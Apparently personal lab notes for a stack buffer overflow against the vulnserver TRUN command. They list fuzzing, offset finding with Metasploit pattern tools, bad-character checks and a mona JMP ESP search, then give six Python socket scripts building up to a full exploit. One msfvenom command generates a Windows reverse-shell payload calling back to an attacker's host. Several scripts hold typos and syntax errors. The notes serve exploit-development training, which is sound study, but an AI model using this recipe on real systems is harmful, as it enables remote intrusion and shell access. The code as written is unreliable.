Fuzzing
	immunity debugger

Find the Offset
generate random code (code1)
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
send the code to confirm a crash
reopen server + immunity debugger(with server attached)
re-execute fuzzer/pattern script (code2)
once crashes - check which EIP it dies on
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP>
if the offset is calculated - change code to see if the EIP can be overwritten (code3)
run the code - and check to make sure EIP was overwritten

#NB Bad Characters
	nullbyte - 0x00 - usually a badchar
	google - badchars for a good list
	check the crash of your program for missing characters - test and adjust

mona module
	put the .py into immunity debugger pycommands folder
	go to kali - use nasm_shell
		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
	convert assembly to hex
		JUMP ESP = FFE4
	back to mona
		mona find -s 'xffxe4' -m <your dll/module>
		take result as your return address
	run code 5
	generate payload
		msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c(cshellcode) -a x86 --platform windows -b(badchar) "\x00"
	

ASLR - Address Space Location Randomisation

python fuzzing script -1
#!/usr/bin/python
import socket
import sys

buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter += 200

for string in buffer:
	print("Fuzzing vulnserver with " %s len(string))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('<ip>',<port>))
	s.send(('TRUN /.:/' + string))
	s.close()

python pattern script -2
#!/usr/bin/python
import socket
import sys

shellcode = "<randomcode>"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect=s.connect(('<ip>',<port>))
	s.send(('TRUN /.:/' + shellcode))
except:
	print "check debugger"
s.close()

script -3
python pattern script -2
#!/usr/bin/python
import socket
import sys

shellcode = "A * <offset> + "B" * 4

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect=s.connect(('<ip>',<port>))
	s.send(('TRUN /.:/' + shellcode))
except:
	print "check debugger"
s.close()

badchar code -4
#!/usr/bin/python
import socket
import sys

badchar = (
"list")

shellcode = "A" * <offset> + "B" * 4 + badchars

s=socket.socet(socket.AF_INET, socket.SOCKET_STREAM)

try:
	connect=s.connect(('<ip>',<PORT>))
	s.send(("TRUN /.:/" + shellcode))
except:
	print("check debugger")
s.close()

module code -5
#!/usr/bin/python
import socket
import sys


shellcode = "A" * <offset> + "<reversedaddr>" 

s=socket.socet(socket.AF_INET, socket.SOCKET_STREAM)

try:
	connect=s.connect(('<ip>',<PORT>))
	s.send(("TRUN /.:/" + shellcode))
except:
	print("check debugger")
s.close()

exploit code -6
#!/usr/bin/python
import socket
import sys


exploit = (
"exploitcode")

shellcode = "A" * <offset> + "<reversedaddr>" + "\x90"<no operation> * 32 + exploit 

s=socket.socet(socket.AF_INET, socket.SOCKET_STREAM)

try:
	connect=s.connect(('<ip>',<PORT>))
	s.send(("TRUN /.:/" + shellcode))
except:
	print("check debugger")
s.close()